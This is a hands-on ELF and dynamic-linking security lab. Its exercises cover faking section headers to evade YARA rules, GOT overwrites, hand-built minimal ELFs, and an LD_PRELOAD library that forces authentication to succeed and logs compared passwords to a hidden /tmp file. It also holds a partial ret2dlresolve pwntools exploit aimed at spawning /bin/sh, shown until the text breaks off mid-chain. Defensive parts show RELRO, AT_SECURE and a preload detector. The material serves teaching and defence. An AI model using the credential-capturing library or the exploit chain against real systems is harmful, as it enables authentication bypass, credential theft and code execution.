# Tutorial: ELF Foundations and Dynamic Linking — Hands-On Lab

> **Companion to:** `domain1_chapter1A_elf_foundations.md`  
> **Scope:** Parsing ELF headers, manipulating program/section headers, understanding the kernel→loader handoff, GOT/PLT mechanics, lazy binding exploitation, and building defensive tooling for ELF anomaly detection.  
> **Lab Duration:** 16–20 hours (split across multiple sessions)  
> **Skill Level:** Intermediate to advanced. Assumes comfort with C, x86_64 assembly, Linux userspace, and basic reverse engineering concepts.

---

## Lab Environment Setup

### Hardware Requirements
- x86_64 Linux system (bare metal or VM with nested virtualization)
- Minimum 8 GB RAM, 50 GB disk
- CPU with hardware virtualization support (for kernel debugging labs)

### Operating System
- Ubuntu 22.04 LTS or Debian 12 (stable glibc for reproducible results)
- Kernel 5.15+ (for modern binfmt_elf behavior)

### Tool Installation

```bash
#!/bin/bash
# lab_setup.sh — ELF Foundations Lab Environment

set -euo pipefail

echo "[*] Installing core toolchain..."
sudo apt update && sudo apt install -y \
    build-essential \
    gcc-multilib \
    nasm \
    binutils \
    elfutils \
    patchelf \
    gdb \
    gdb-multiarch \
    strace \
    ltrace \
    python3 python3-pip python3-venv \
    radare2 \
    hexdump \
    xxd \
    yara \
    libyara-dev \
    libelf-dev \
    libcapstone-dev \
    qemu-user \
    linux-tools-common \
    linux-tools-generic

echo "[*] Installing Python analysis libraries..."
python3 -m pip install --user \
    lief \
    pyelftools \
    capstone \
    keystone-engine \
    unicorn \
    pwntools \
    yara-python \
    rich

echo "[*] Installing GEF for GDB..."
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

echo "[*] Building custom lab tools..."
mkdir -p ~/elf-lab/{bin,src,samples,output,yara-rules}

echo "[*] Cloning reference projects..."
cd ~/elf-lab/src
git clone --depth 1 https://sourceware.org/git/glibc.git glibc-src 2>/dev/null || true
git clone --depth 1 https://github.com/eliben/pyelftools.git 2>/dev/null || true

echo "[*] Downloading sample binaries..."
cd ~/elf-lab/samples
# Compile various test binaries
cat > hello_static.c << 'CEOF'
#include <stdio.h>
int main(void) { puts("Hello from static"); return 0; }
CEOF

cat > hello_dynamic.c << 'CEOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int global_var = 42;
int bss_var;
__attribute__((constructor)) void init_func(void) { bss_var = 1; }
int main(void) {
    char *buf = malloc(64);
    snprintf(buf, 64, "Dynamic: global=%d bss=%d", global_var, bss_var);
    puts(buf);
    free(buf);
    return 0;
}
CEOF

cat > hello_pie.c << 'CEOF'
#include <stdio.h>
#include <dlfcn.h>
int main(void) {
    printf("main at %p\n", (void*)main);
    void *h = dlopen("libm.so.6", RTLD_LAZY);
    if (h) { printf("libm at %p\n", dlsym(h, "sin")); dlclose(h); }
    return 0;
}
CEOF

# Compile with different configurations
gcc -static -o hello_static hello_static.c
gcc -no-pie -o hello_nopie hello_dynamic.c
gcc -pie -o hello_pie hello_pie.c -ldl
gcc -shared -fPIC -o libexample.so -xc - << 'CEOF'
int lib_func(int x) { return x * 2; }
int lib_data = 99;
CEOF
gcc -pie -o hello_lib hello_dynamic.c -L. -lexample -Wl,-rpath,'$ORIGIN'

echo "[+] Lab environment ready at ~/elf-lab/"
echo "    samples/ — test binaries"
echo "    src/     — reference source code"
echo "    bin/     — your custom tools"
echo "    output/  — analysis results"
```

### Directory Structure After Setup

```
~/elf-lab/
├── bin/              # Custom tools you build during the lab
├── src/              # Reference implementations (glibc, pyelftools)
│   ├── glibc-src/
│   └── pyelftools/
├── samples/          # Test binaries compiled above
│   ├── hello_static
│   ├── hello_nopie
│   ├── hello_pie
│   ├── libexample.so
│   └── hello_lib
├── output/           # Analysis outputs
└── yara-rules/       # Detection rules you write
```

### Verification

```bash
# Verify all tools are accessible
readelf --version
objdump --version
python3 -c "import lief; import elftools; print('OK')"
gdb --batch -ex "python print(gdb.VERSION)"
yara --version
```

---

## PART A: OFFENSIVE — ELF Manipulation and Abuse

### Exercise A1: Header Manipulation — Crafting Deceptive ELF Binaries

**Objective:** Demonstrate that section headers are cosmetic to execution by creating a binary that runs perfectly despite having a completely falsified section header table.

**Concepts tested:** The kernel's exclusive reliance on program headers; section table as analysis metadata only.

#### Step 1: Understand the baseline

```bash
cd ~/elf-lab/samples
readelf -h hello_pie
readelf -l hello_pie
readelf -S hello_pie
```

Record the output. Note `e_shoff`, `e_shnum`, `e_shstrndx`.

#### Step 2: Strip the section header table entirely

```bash
cp hello_pie hello_pie_nosections
# Zero out e_shoff (bytes 40-47 in a 64-bit ELF) and e_shnum (bytes 60-61)
python3 << 'EOF'
import struct

with open("hello_pie_nosections", "r+b") as f:
    # Read the header
    ehdr = f.read(64)
    
    # Parse e_shoff at offset 40 (8 bytes, little-endian)
    e_shoff = struct.unpack_from('<Q', ehdr, 40)[0]
    e_shnum = struct.unpack_from('<H', ehdr, 60)[0]
    e_shstrndx = struct.unpack_from('<H', ehdr, 62)[0]
    
    print(f"[*] Original: e_shoff=0x{e_shoff:x}, e_shnum={e_shnum}, e_shstrndx={e_shstrndx}")
    
    # Zero them out
    f.seek(40)
    f.write(struct.pack('<Q', 0))   # e_shoff = 0
    f.seek(60)
    f.write(struct.pack('<H', 0))   # e_shnum = 0
    f.seek(62)
    f.write(struct.pack('<H', 0))   # e_shstrndx = 0
    
    print("[+] Section header table reference zeroed")

EOF

# Verify it still runs
chmod +x hello_pie_nosections
./hello_pie_nosections
echo "Exit code: $?"
```

**Expected output:** The binary runs identically. `readelf -S` reports no sections. `readelf -l` still shows all program headers intact.

#### Step 3: Inject a fake section header table with misleading names

```python
#!/usr/bin/env python3
"""
fake_sections.py — Injects a completely fabricated section header table
into an ELF binary. The binary still runs because the kernel only reads
program headers, but naive analysis tools will be deceived.
"""
import struct
import sys
import os

def create_fake_sections(input_path, output_path):
    with open(input_path, 'rb') as f:
        data = bytearray(f.read())
    
    # Parse ELF header
    e_phoff = struct.unpack_from('<Q', data, 32)[0]
    e_phentsize = struct.unpack_from('<H', data, 54)[0]
    e_phnum = struct.unpack_from('<H', data, 56)[0]
    
    # Build fake section name string table
    fake_names = [
        b'\x00',                    # index 0: empty
        b'.totally_normal\x00',     # index 1
        b'.nothing_suspicious\x00', # index 18
        b'.legit_code\x00',         # index 39
        b'.real_data\x00',          # index 51
        b'.shstrtab\x00',           # index 62
    ]
    shstrtab = b''.join(fake_names)
    
    # We'll place the fake shstrtab and section headers at the end of the file
    shstrtab_offset = len(data)
    data.extend(shstrtab)
    
    # Align to 8 bytes
    while len(data) % 8 != 0:
        data.append(0)
    
    shdr_offset = len(data)
    
    # Build fake section headers (64 bytes each)
    # SHT_NULL entry (required as index 0)
    sections = [
        struct.pack('<IIQQQQIIQQ', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0),
    ]
    
    # Fake .totally_normal (pretend it's the text, but with wrong addr)
    sections.append(struct.pack('<IIQQQQIIQQ',
        1,          # sh_name (index into shstrtab)
        1,          # sh_type = SHT_PROGBITS
        6,          # sh_flags = SHF_ALLOC | SHF_EXECINSTR
        0x400000,   # sh_addr (fake — doesn't match any real segment)
        0x1000,     # sh_offset (arbitrary)
        0x500,      # sh_size (arbitrary)
        0, 0,       # sh_link, sh_info
        16,         # sh_addralign
        0           # sh_entsize
    ))
    
    # Fake .nothing_suspicious (writable data, also fake)
    sections.append(struct.pack('<IIQQQQIIQQ',
        18, 1, 3, 0x600000, 0x2000, 0x200, 0, 0, 8, 0
    ))
    
    # Fake .legit_code
    sections.append(struct.pack('<IIQQQQIIQQ',
        39, 1, 6, 0x401000, 0x1500, 0x300, 0, 0, 16, 0
    ))
    
    # Fake .real_data
    sections.append(struct.pack('<IIQQQQIIQQ',
        51, 1, 3, 0x602000, 0x3000, 0x100, 0, 0, 8, 0
    ))
    
    # shstrtab section header (points to our real string table)
    sections.append(struct.pack('<IIQQQQIIQQ',
        62,             # sh_name
        3,              # sh_type = SHT_STRTAB
        0,              # sh_flags
        0,              # sh_addr
        shstrtab_offset, # sh_offset
        len(shstrtab),  # sh_size
        0, 0, 1, 0
    ))
    
    for shdr in sections:
        data.extend(shdr)
    
    # Patch the ELF header to point to our fake section table
    struct.pack_into('<Q', data, 40, shdr_offset)   # e_shoff
    struct.pack_into('<H', data, 58, 64)            # e_shentsize
    struct.pack_into('<H', data, 60, len(sections)) # e_shnum
    struct.pack_into('<H', data, 62, len(sections) - 1)  # e_shstrndx
    
    with open(output_path, 'wb') as f:
        f.write(data)
    os.chmod(output_path, 0o755)
    
    print(f"[+] Written {output_path} with {len(sections)} fake sections")
    print(f"    Section header table at offset 0x{shdr_offset:x}")
    print(f"    Binary still runs because kernel only reads program headers")

if __name__ == '__main__':
    create_fake_sections('hello_pie', 'hello_pie_fakesections')
```

```bash
python3 fake_sections.py
./hello_pie_fakesections   # Still runs
readelf -S hello_pie_fakesections  # Shows fake section names
```

**Expected output:** The binary executes correctly. Tools like `readelf -S` display completely fabricated section information that has no relationship to the actual code layout.

#### Step 4: Observe how this defeats naive YARA rules

```bash
# A naive YARA rule that checks section names
cat > ~/elf-lab/yara-rules/naive_section_check.yar << 'EOF'
rule has_text_section {
    meta:
        description = "Checks for .text section by name"
    condition:
        elf.sections[1].name == ".text"
}
EOF

# This rule will NOT match our fake-sections binary
yara ~/elf-lab/yara-rules/naive_section_check.yar hello_pie_fakesections
# No match — the section is named .totally_normal, not .text

yara ~/elf-lab/yara-rules/naive_section_check.yar hello_pie
# Matches the original
```

**Security implication:** Any detection logic that relies on section names or section-derived metadata can be trivially bypassed by an adversary who modifies the section header table without touching the program headers.

---

### Exercise A2: GOT/PLT Hijacking via Process Memory

**Objective:** Demonstrate runtime GOT overwrite to redirect function calls in a running process. This is the foundational technique behind many exploitation primitives.

**Concepts tested:** GOT writability under partial RELRO, lazy binding mechanics, `_dl_runtime_resolve` abuse.

#### Step 1: Compile a vulnerable target

```c
// target_got_hijack.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

void secret_function(void) {
    printf("[!] SECRET FUNCTION CALLED — GOT hijack successful!\n");
    printf("[!] In a real attack, this could be system(\"/bin/sh\")\n");
}

int main(void) {
    char buf[256];
    
    printf("[*] Target process PID: %d\n", getpid());
    printf("[*] Address of main: %p\n", (void*)main);
    printf("[*] Address of secret_function: %p\n", (void*)secret_function);
    printf("[*] Address of puts (via PLT): %p\n", (void*)puts);
    
    // Simulate a "write-what-where" primitive
    printf("\n[*] Enter GOT address to overwrite (hex): ");
    fflush(stdout);
    if (fgets(buf, sizeof(buf), stdin) == NULL) return 1;
    unsigned long got_addr = strtoul(buf, NULL, 16);
    
    printf("[*] Enter value to write (hex): ");
    fflush(stdout);
    if (fgets(buf, sizeof(buf), stdin) == NULL) return 1;
    unsigned long new_val = strtoul(buf, NULL, 16);
    
    printf("[*] Writing 0x%lx to address 0x%lx...\n", new_val, got_addr);
    
    // Simulate arbitrary write (in real exploit this comes from vuln)
    *(unsigned long*)got_addr = new_val;
    
    printf("[*] Now calling puts() through PLT...\n");
    puts("This should call puts, but if GOT was overwritten...");
    
    return 0;
}
```

```bash
# Compile with partial RELRO (default) — GOT.PLT remains writable
gcc -Wl,-z,relro -no-pie -o target_got_hijack target_got_hijack.c

# Verify RELRO status
readelf -l target_got_hijack | grep GNU_RELRO
readelf -d target_got_hijack | grep BIND_NOW
# Should show GNU_RELRO but NOT BIND_NOW (partial RELRO)
```

#### Step 2: Find the GOT entry for `puts`

```bash
# Method 1: objdump
objdump -R target_got_hijack | grep puts

# Method 2: readelf
readelf -r target_got_hijack | grep puts

# Method 3: GDB
gdb -batch -ex "file target_got_hijack" -ex "disas puts@plt" -ex "quit"
```

Record the GOT address for `puts`. It will be something like `0x404018`.

#### Step 3: Execute the hijack

```bash
# Get the address of secret_function
nm target_got_hijack | grep secret_function
# e.g., 0x401176

# Run the target and provide the GOT address and secret_function address
./target_got_hijack
# Enter the GOT address of puts when prompted
# Enter the address of secret_function when prompted
```

**Expected output:** After the GOT overwrite, the `puts()` call in the code actually jumps to `secret_function` instead, demonstrating successful control-flow hijacking.

#### Step 4: Observe with GDB

```bash
gdb ./target_got_hijack << 'GDB'
set pagination off
break main
run
# At main, examine the GOT
printf "[*] puts@GOT before resolution:\n"
x/gx &puts@got.plt
# Continue to trigger lazy binding
call (void)puts("trigger")
printf "[*] puts@GOT after resolution:\n"
x/gx &puts@got.plt
continue
GDB
```

#### Step 5: Demonstrate full RELRO protection

```bash
# Recompile with full RELRO
gcc -Wl,-z,relro,-z,now -no-pie -o target_got_fullrelro target_got_hijack.c

# Verify
readelf -d target_got_fullrelro | grep BIND_NOW
# Should show BIND_NOW

# Try the same attack — will SEGFAULT on the write
./target_got_fullrelro
# The write to GOT will trigger SIGSEGV because the page is read-only
```

**Security lesson:** Full RELRO (`-z relro -z now`) is the mitigation. It forces eager symbol resolution and then `mprotect`s the entire GOT read-only. The performance cost (all symbols resolved at startup) is the tradeoff.

---

### Exercise A3: Crafting a Minimal ELF from Scratch (No Libc, No Linker)

**Objective:** Build a working ELF binary byte-by-byte in NASM, understanding every header field's role. This demonstrates that the minimum viable ELF is just headers + code — no sections required.

**Concepts tested:** `e_entry`, `PT_LOAD`, kernel loading requirements, minimal binary analysis.

#### Step 1: Write the minimal ELF

```nasm
; minimal_elf.asm — Smallest possible working ELF64
; Assembled directly into a valid executable with NO section headers
; nasm -f bin -o minimal_elf minimal_elf.asm

BITS 64
org 0x400000        ; Load address

; === ELF Header (64 bytes) ===
ehdr:
    db 0x7F, 'E', 'L', 'F'     ; e_ident[EI_MAG]
    db 2                         ; e_ident[EI_CLASS] = ELFCLASS64
    db 1                         ; e_ident[EI_DATA] = ELFDATA2LSB
    db 1                         ; e_ident[EI_VERSION] = EV_CURRENT
    db 0                         ; e_ident[EI_OSABI] = ELFOSABI_NONE
    dq 0                         ; e_ident padding (8 bytes)
    dw 2                         ; e_type = ET_EXEC
    dw 0x3E                      ; e_machine = EM_X86_64
    dd 1                         ; e_version = EV_CURRENT
    dq _start                    ; e_entry
    dq phdr - ehdr               ; e_phoff (program header offset)
    dq 0                         ; e_shoff = 0 (NO section headers)
    dd 0                         ; e_flags
    dw ehdr_size                 ; e_ehsize
    dw phdr_size                 ; e_phentsize
    dw 1                         ; e_phnum = 1 (single PT_LOAD)
    dw 0                         ; e_shentsize = 0
    dw 0                         ; e_shnum = 0
    dw 0                         ; e_shstrndx = 0
ehdr_size equ $ - ehdr

; === Program Header (56 bytes) ===
phdr:
    dd 1                         ; p_type = PT_LOAD
    dd 5                         ; p_flags = PF_R | PF_X
    dq 0                         ; p_offset (load from file start)
    dq 0x400000                  ; p_vaddr
    dq 0x400000                  ; p_paddr
    dq file_size                 ; p_filesz
    dq file_size                 ; p_memsz
    dq 0x1000                    ; p_align
phdr_size equ $ - phdr

; === Code ===
_start:
    ; write(1, msg, msg_len)
    mov rax, 1          ; sys_write
    mov rdi, 1          ; fd = stdout
    lea rsi, [rel msg]  ; buffer
    mov rdx, msg_len    ; length
    syscall
    
    ; exit(0)
    mov rax, 60         ; sys_exit
    xor rdi, rdi        ; status = 0
    syscall

msg: db "Hello from hand-crafted ELF!", 0x0A
msg_len equ $ - msg

file_size equ $ - ehdr
```

```bash
cd ~/elf-lab/src
nasm -f bin -o ../samples/minimal_elf minimal_elf.asm
chmod +x ../samples/minimal_elf
../samples/minimal_elf

# Examine it
ls -la ../samples/minimal_elf    # Should be ~170 bytes
readelf -h ../samples/minimal_elf
readelf -l ../samples/minimal_elf
readelf -S ../samples/minimal_elf  # "There are no sections in this file."
file ../samples/minimal_elf
```

**Expected output:** A working executable under 200 bytes with no section headers, no dynamic linking, no libc. The kernel loads it via the single `PT_LOAD` segment and jumps to `_start`.

#### Step 2: Make it even smaller (overlapping headers)

```nasm
; tiny_elf.asm — ELF with overlapping ELF header and program header
; This exploits that the ELF header and program header can share bytes
; on positions that the kernel doesn't validate strictly

BITS 64
org 0x400000

; ELF header begins
    db 0x7F, 'E', 'L', 'F'  ; magic
    db 2, 1, 1, 0            ; class, data, version, osabi
    dq 0                      ; padding
    dw 2                      ; e_type = ET_EXEC
    dw 0x3E                   ; e_machine = EM_X86_64
    dd 1                      ; e_version
    dq _start                 ; e_entry
    dq 0x38                   ; e_phoff = 56 (immediately after ehdr)
    dq 0                      ; e_shoff
    dd 0                      ; e_flags
    dw 64                     ; e_ehsize
    dw 56                     ; e_phentsize
    dw 1                      ; e_phnum
    dw 0, 0, 0               ; e_shentsize, e_shnum, e_shstrndx

; Program header at offset 0x38
    dd 1                      ; p_type = PT_LOAD
    dd 7                      ; p_flags = PF_R | PF_W | PF_X (RWX for simplicity)
    dq 0                      ; p_offset
    dq 0x400000               ; p_vaddr
    dq 0x400000               ; p_paddr
    dq filesize               ; p_filesz
    dq filesize               ; p_memsz
    dq 0x200000               ; p_align

_start:
    ; sys_write(1, msg, len)
    push 1
    pop rax
    mov edi, eax
    lea rsi, [rel msg]
    push 14
    pop rdx
    syscall
    ; sys_exit(0)
    push 60
    pop rax
    cdq
    mov edi, edx
    syscall

msg: db "Tiny ELF!", 0x0A, 0, 0, 0, 0

filesize equ $ - $$
```

```bash
nasm -f bin -o ../samples/tiny_elf tiny_elf.asm
chmod +x ../samples/tiny_elf
../samples/tiny_elf
wc -c ../samples/tiny_elf  # Should be ~150 bytes
```

**Security relevance:** Extremely small ELF binaries (shellcode droppers, implants) use these techniques to minimize disk footprint and bypass size-based heuristics.

---

### Exercise A4: LD_PRELOAD Interposition Attack

**Objective:** Build a shared library that intercepts libc functions via `LD_PRELOAD`, demonstrating the dynamic linker's symbol resolution order as an attack vector.

**Concepts tested:** Symbol scope, `DT_NEEDED` ordering, `RTLD_NEXT`, `AT_SECURE` bypass conditions.

#### Step 1: Create the target application

```c
// banking_app.c — Simulates a sensitive application
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int authenticate(const char *password) {
    return strcmp(password, "s3cur3_p4ss!") == 0;
}

void transfer_funds(const char *from, const char *to, double amount) {
    printf("[BANK] Transferring $%.2f from %s to %s\n", amount, from, to);
}

int main(void) {
    char password[64];
    printf("[BANK] Secure Banking Application v1.0\n");
    printf("[BANK] PID: %d\n", getpid());
    printf("Enter password: ");
    fflush(stdout);
    
    if (fgets(password, sizeof(password), stdin) == NULL) return 1;
    password[strcspn(password, "\n")] = '\0';
    
    if (authenticate(password)) {
        printf("[BANK] Authentication successful!\n");
        transfer_funds("Alice", "Bob", 1000.00);
    } else {
        printf("[BANK] Authentication FAILED.\n");
    }
    return 0;
}
```

```bash
gcc -o banking_app banking_app.c
```

#### Step 2: Build the interception library

```c
// evil_preload.c — LD_PRELOAD interception library
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/types.h>

// File to exfiltrate credentials to
#define EXFIL_LOG "/tmp/.captured_creds.log"

// Intercept strcmp — capture password comparisons
int strcmp(const char *s1, const char *s2) {
    // Get the real strcmp
    int (*real_strcmp)(const char *, const char *);
    real_strcmp = dlsym(RTLD_NEXT, "strcmp");
    
    // Log potential credential comparisons
    // Heuristic: if one string looks like a password field...
    if (strlen(s1) > 3 && strlen(s2) > 3) {
        FILE *log = fopen(EXFIL_LOG, "a");
        if (log) {
            fprintf(log, "[strcmp] PID=%d: \"%s\" vs \"%s\"\n", 
                    getpid(), s1, s2);
            fclose(log);
        }
    }
    
    // Always return 0 (match) to bypass auth
    // In a stealthier attack, only bypass for specific conditions
    return 0;
}

// Intercept puts — monitor output
int puts(const char *s) {
    int (*real_puts)(const char *);
    real_puts = dlsym(RTLD_NEXT, "puts");
    
    FILE *log = fopen(EXFIL_LOG, "a");
    if (log) {
        fprintf(log, "[puts] PID=%d: %s\n", getpid(), s);
        fclose(log);
    }
    
    return real_puts(s);
}

// Constructor — runs before main()
__attribute__((constructor))
void evil_init(void) {
    FILE *log = fopen(EXFIL_LOG, "a");
    if (log) {
        fprintf(log, "\n=== PRELOAD ACTIVE: PID=%d, PPID=%d ===\n",
                getpid(), getppid());
        
        // Log the target binary
        char exe[256];
        ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe)-1);
        if (len > 0) { exe[len] = '\0'; fprintf(log, "Target: %s\n", exe); }
        
        fclose(log);
    }
}
```

```bash
gcc -shared -fPIC -o evil_preload.so evil_preload.c -ldl

# Attack: inject into the banking app
LD_PRELOAD=./evil_preload.so ./banking_app
# Enter ANY password — it will authenticate because strcmp always returns 0

# View exfiltrated data
cat /tmp/.captured_creds.log
```

**Expected output:** The banking app authenticates with any password. The log file contains the actual password that was compared, plus all `puts` output.

#### Step 3: Demonstrate AT_SECURE protection

```bash
# Make the binary setuid (requires root)
sudo chown root:root banking_app
sudo chmod u+s banking_app

# Now LD_PRELOAD is ignored by the dynamic linker
LD_PRELOAD=./evil_preload.so ./banking_app
# LD_PRELOAD has NO effect — AT_SECURE is set

# Verify with LD_DEBUG
LD_DEBUG=libs LD_PRELOAD=./evil_preload.so ./banking_app 2>&1 | head -5
# Should not show evil_preload.so being loaded
```

#### Step 4: Build a detection mechanism

```c
// detect_preload.c — Detect LD_PRELOAD at runtime
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <link.h>
#include <dlfcn.h>

// Check if any unexpected libraries are loaded
static int check_callback(struct dl_phdr_info *info, size_t size, void *data) {
    int *suspicious = (int*)data;
    const char *name = info->dlpi_name;
    
    if (name && strlen(name) > 0) {
        // Check for suspicious indicators
        if (strstr(name, "preload") || 
            strstr(name, "inject") ||
            strstr(name, "hook") ||
            strstr(name, "/tmp/") ||
            strstr(name, "/dev/shm/")) {
            printf("[ALERT] Suspicious library loaded: %s at 0x%lx\n",
                   name, (unsigned long)info->dlpi_addr);
            (*suspicious)++;
        }
    }
    return 0;
}

int detect_preload_injection(void) {
    int suspicious = 0;
    
    // Method 1: Check LD_PRELOAD environment variable
    const char *preload = getenv("LD_PRELOAD");
    if (preload && strlen(preload) > 0) {
        printf("[ALERT] LD_PRELOAD is set: %s\n", preload);
        suspicious++;
    }
    
    // Method 2: Walk loaded libraries
    dl_iterate_phdr(check_callback, &suspicious);
    
    // Method 3: Check /proc/self/maps for suspicious mappings
    FILE *maps = fopen("/proc/self/maps", "r");
    if (maps) {
        char line[512];
        while (fgets(line, sizeof(line), maps)) {
            if (strstr(line, "preload") || strstr(line, "/tmp/") ||
                strstr(line, "/dev/shm/")) {
                printf("[ALERT] Suspicious mapping: %s", line);
                suspicious++;
            }
        }
        fclose(maps);
    }
    
    // Method 4: Verify function pointers haven't been redirected
    void *libc_puts = dlsym(RTLD_NEXT, "puts");
    Dl_info info;
    if (dladdr(libc_puts, &info)) {
        if (!strstr(info.dli_fname, "libc")) {
            printf("[ALERT] puts() resolves to non-libc: %s\n", info.dli_fname);
            suspicious++;
        }
    }
    
    return suspicious;
}

int main(void) {
    printf("[*] LD_PRELOAD Detection Demo\n");
    int alerts = detect_preload_injection();
    if (alerts > 0) {
        printf("[!] DETECTED %d suspicious indicators!\n", alerts);
    } else {
        printf("[+] No LD_PRELOAD injection detected\n");
    }
    return alerts > 0 ? 1 : 0;
}
```

```bash
gcc -o detect_preload detect_preload.c -ldl
./detect_preload                              # Clean — no alerts
LD_PRELOAD=./evil_preload.so ./detect_preload  # Detects the injection
```

---

### Exercise A5: Exploiting `_dl_runtime_resolve` (ret2dlresolve)

**Objective:** Construct a ret2dlresolve exploit payload that forces the dynamic linker to resolve a fake symbol entry, calling `system("/bin/sh")` without needing a libc leak.

**Concepts tested:** `.rela.plt` structure, `_dl_fixup` internals, `.dynsym`/`.dynstr` layout, relocation index manipulation.

#### Step 1: Create a vulnerable binary

```c
// vuln_dlresolve.c — Stack buffer overflow with limited gadgets
#include <stdio.h>
#include <unistd.h>

void vuln(void) {
    char buf[64];
    printf("Input: ");
    fflush(stdout);
    read(0, buf, 256);  // Overflow!
}

int main(void) {
    vuln();
    return 0;
}
```

```bash
# Compile: no PIE, partial RELRO, NX enabled
gcc -no-pie -fno-stack-protector -Wl,-z,relro -o vuln_dlresolve vuln_dlresolve.c
checksec --file=vuln_dlresolve
```

#### Step 2: Analyze the binary's dynamic structures

```python
#!/usr/bin/env python3
"""
analyze_dlresolve.py — Map out the structures needed for ret2dlresolve
"""
from pwn import *

elf = ELF('./vuln_dlresolve')

print("=== Binary Analysis for ret2dlresolve ===\n")

# Key addresses
print(f"[*] .dynamic:   0x{elf.dynamic_value_by_tag('DT_NULL'):x} (from DT_NULL)")
print(f"[*] .dynsym:    0x{elf.dynamic_value_by_tag('DT_SYMTAB'):x}")
print(f"[*] .dynstr:    0x{elf.dynamic_value_by_tag('DT_STRTAB'):x}")
print(f"[*] .rela.plt:  0x{elf.dynamic_value_by_tag('DT_JMPREL'):x}")
print(f"[*] .got.plt:   0x{elf.dynamic_value_by_tag('DT_PLTGOT'):x}")
print(f"[*] PLT[0]:     0x{elf.get_section_by_name('.plt').header.sh_addr:x}")

print(f"\n[*] STRTAB size: {elf.dynamic_value_by_tag('DT_STRSZ')}")
print(f"[*] SYMENT size: {elf.dynamic_value_by_tag('DT_SYMENT')}")
print(f"[*] PLTRELSZ:   {elf.dynamic_value_by_tag('DT_PLTRELSZ')}")

# BSS area (writable, good for fake structures)
bss = elf.bss()
print(f"\n[*] .bss start: 0x{bss:x}")
print(f"[*] Writable area for fake structures: 0x{bss + 0x100:x}")

# Existing relocations
print("\n[*] Existing .rela.plt entries:")
for rel in elf.relocs:
    if rel.name:
        print(f"    {rel.name}: offset=0x{rel.offset:x}, "
              f"info=0x{rel.info:x}, type={rel.type}")
```

```bash
python3 analyze_dlresolve.py
```

#### Step 3: Build the exploit

```python
#!/usr/bin/env python3
"""
exploit_dlresolve.py — ret2dlresolve attack
Forces the dynamic linker to resolve a fake symbol 'system' and call it
with '/bin/sh' as argument, without needing any info leak.
"""
from pwn import *

context.binary = elf = ELF('./vuln_dlresolve')
context.log_level = 'info'

# Key structure addresses
JMPREL  = elf.dynamic_value_by_tag('DT_JMPREL')
SYMTAB  = elf.dynamic_value_by_tag('DT_SYMTAB')
STRTAB  = elf.dynamic_value_by_tag('DT_STRTAB')
PLTGOT  = elf.dynamic_value_by_tag('DT_PLTGOT')

# PLT[0] pushes link_map and jumps to _dl_runtime_resolve
PLT0    = elf.get_section_by_name('.plt').header.sh_addr

# Writable area for our fake structures
# We'll use a known writable address past .bss
FAKE_AREA = elf.bss() + 0x200

# Overflow offset (64 bytes buffer + 8 bytes saved RBP)
OFFSET = 64 + 8

print(f"[*] JMPREL (DT_JMPREL): 0x{JMPREL:x}")
print(f"[*] SYMTAB (DT_SYMTAB): 0x{SYMTAB:x}")
print(f"[*] STRTAB (DT_STRTAB): 0x{STRTAB:x}")
print(f"[*] PLT[0]: 0x{PLT0:x}")
print(f"[*] Fake structures at: 0x{FAKE_AREA:x}")

# Calculate the relocation index that _dl_runtime_resolve will use
# It indexes into .rela.plt: index = (fake_rela_addr - JMPREL) / 24
fake_rela_addr = FAKE_AREA
reloc_index = (fake_rela_addr - JMPREL) // 24

# The fake Elf64_Rela must have:
#   r_offset = writable address (where resolved address gets written)
#   r_info   = (sym_index << 32) | R_X86_64_JUMP_SLOT(7)
# sym_index must point to our fake Elf64_Sym in .dynsym

# Place fake Elf64_Sym after the fake Elf64_Rela
fake_sym_addr = FAKE_AREA + 24  # After the 24-byte Elf64_Rela
sym_index = (fake_sym_addr - SYMTAB) // 24

# Place the string "system\x00" after the fake Elf64_Sym
fake_str_addr = fake_sym_addr + 24  # After the 24-byte Elf64_Sym
st_name = fake_str_addr - STRTAB

# Place "/bin/sh\x00" after "system\x00"
binsh_addr = fake_str_addr + 7  # After "system\0"

print(f"[*] reloc_index: {reloc_index}")
print(f"[*] sym_index: {sym_index}")
print(f"[*] st_name offset: {st_name}")

# Build the fake structures
# Elf64_Rela: r_offset(8) + r_info(8) + r_addend(8) = 24 bytes
r_offset = FAKE_AREA + 0x100  # Writable GOT-like slot
r_info = (sym_index << 32) | 7  # R_X86_64_JUMP_SLOT
r_addend = 0

fake_rela = p64(r_offset) + p64(r_info) + p64(r_addend)

# Elf64_Sym: st_name(4) + st_info(1) + st_other(1) + st_shndx(2) + 
#            st_value(8) + st_size(8) = 24 bytes
fake_sym = p32(st_name)  # st_name
fake_sym += p8(0x12)     # st_info = STB_GLOBAL | STT_FUNC
fake_sym += p8(0)        # st_other = STV_DEFAULT
fake_sym += p16(0)       # st_shndx = SHN_UNDEF (needs resolution)
fake_sym += p64(0)       # st_value
fake_sym += p64(0)       # st_size

# String payloads
fake_str = b"system\x00"
binsh_str = b"/bin/sh\x00"

# Assemble the fake area payload
fake_payload = fake_rela + fake_sym + fake_str + binsh_str

# Find a gadget: pop rdi; ret (to set the argument)
rop = ROP(elf)
try:
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
except:
    # If no pop rdi in binary, check for it
    pop_rdi = next(elf.search(asm('pop rdi; ret')))

print(f"[*] pop rdi; ret gadget: 0x{pop_rdi:x}")

# We need a way to write fake_payload to FAKE_AREA first
# Use a read() ROP chain to stage the data
# read@plt exists since we use it in vuln()
read_plt = elf.plt.get('read', elf.plt.get('read'))

# Stage 1: Return to read() to write fake structures to FAKE_AREA
# Stage 2: Call PLT[0] with our reloc_index to trigger fake resolution

# ROP chain
payload = b'A' * OFFSET

# First: write fake structures via read(0, FAKE_AREA, len(fake_payload))
payload += p64(pop_rdi)
payload += p64(0)                    # fd = stdin
# Need pop rsi gadget too
try:
    pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address
    payload += p64(pop_rsi_r15)
    payload += p64(FAKE_AREA)        # buf = FAKE_AREA
    payload += p64(0)                # junk for r15
except:
    print("[!] Need pop rsi gadget — adjusting approach")
